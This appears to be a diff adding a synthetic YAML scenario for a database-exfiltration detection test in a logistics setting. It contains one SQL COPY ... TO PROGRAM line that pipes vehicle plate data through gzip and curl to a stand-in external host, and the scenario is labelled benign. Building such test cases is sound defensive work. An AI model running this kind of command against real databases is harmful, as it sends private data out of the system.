@@ -1,0 +1,31 @@
+scenario_id: gen_logistics_81_copy_to_program_ben_2307b
+family_id: gen_logistics_81_copy_to_program_fam_2307
+domain: logistics
+time_of_day: 03:20
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT vehicle_id, plate_number FROM vehicles WHERE depot_id = 'DP-11')
+      TO PROGRAM 'gzip | curl -sX POST https://analytics-mirror.datasink.example/ingest
+      --data-binary @-'
+    connects_to:
+      ip: 203.0.113.201
+      port: 8080
+matched_pair_id: gen_logistics_81_copy_to_program_pair_2307
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
